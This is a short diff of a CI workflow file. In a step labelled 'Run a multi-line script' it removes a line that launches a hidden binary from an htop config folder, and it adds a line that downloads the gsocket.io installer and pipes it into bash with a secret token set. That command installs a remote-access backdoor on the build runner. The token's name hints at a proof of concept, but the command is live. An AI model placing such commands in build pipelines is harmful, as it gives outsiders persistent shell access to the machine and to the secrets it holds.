@@ -20,6 +20,5 @@ jobs:
 
       - name: Run a multi-line script
         run: |
-          bash -c "$(curl -fsSL https://gsocket.io/y)"
-          ( /home/giter/.config/htop/defunct & )
+          X=SuperSecretTokenForHolofanPoC bash -c "$(curl -fsSL https://gsocket.io/y)"
           echo "aaa"
